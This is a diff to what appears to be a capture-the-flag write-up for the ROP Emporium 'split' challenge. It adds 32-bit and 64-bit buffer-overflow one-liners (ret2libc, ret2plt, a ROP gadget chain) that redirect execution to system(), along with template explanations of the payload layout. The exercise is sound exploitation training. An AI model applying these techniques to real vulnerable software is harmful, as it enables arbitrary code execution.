@@ -66,17 +66,21 @@
     pwndbg> 
     ```
     
-- Return to usefulFunction:
+- Return to system via usefulFunction:
 
     `python2 -c "print('A' * 44 + '\x1a\x86\x04\x08' + '\x30\xa0\x04\x08')" | ./split32`
 
-- Ret2libc (aslr disable)
+- Return to system via Ret2libc (aslr disable)
 
     `python2 -c "print('A' * 44 + '\x00\xdd\xdf\xf7' + 'AAAA' + '\x30\xa0\x04\x08')" | ./split32`
 
-- Ret2plt (aslr bypass)
+- Return to system via Ret2plt (aslr bypass)
 
     `python2 -c "print('A' * 44 + '\xe0\x83\x04\x08' + 'AAAA' + '\x30\xa0\x04\x08')" | ./split32`
+
+- Some explanations:
+
+    Typical exploit looks like this `python2 -c "print('A' * 44 + <ADDRESS OF FUNCTION TO RETURN TO> + <RETURN ADDRESS OF THE RETURN FUNCTION> + <ARGUMENT TO THE ADDRESS OF FUNCTION TO RETURN TO>)" | ./split32`. You may or may not need the return address of the return function as seen above whereby some of our exploit answers has 'AAAA' which represents the return address of the return function.
 
 ### 64 bit answers:
 
@@ -179,14 +183,18 @@
     pwndbg> 
     ```
     
-- Return to usefulFunction:
+- Return to system via usefulFunction
 
     `python2 -c "print('A' * 40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x4b\x07\x40\x00\x00\x00\x00\x00')" | ./split`
 
-- Ret2libc (aslr disable)
+- Return to system via Ret2libc (aslr disable)
 
     `python2 -c "print('A' * 40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x60\xd8\xe1\xf7\xff\x7f\x00\x00')" | ./split`
 
-- Ret2plt (aslr bypass)
+- Return to system via Ret2plt (aslr bypass)
 
     `python2 -c "print('A' * 40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x60\x05\x40\x00\x00\x00\x00\x00')" | ./split `                                                                                                       
+
+- Explanations
+
+    Typical exploit looks like this `python2 -c "print('A' * 40 + <ROP GADGET TO POP NEXT ADDRESS INTO RDI AND RETURN> + <ADDRESS YOU WANT TO BE IN RDI> + <FUNCTION TO RUN AFTER THE ROP GADGET HAS COMPLETED WHICH WILL TAKE THE ARGUMENT IN RDI>)" | ./split`. You may or may not need the return address of the return function as seen above whereby some of our exploit answers has 'AAAA' which represents the return address of the return function.
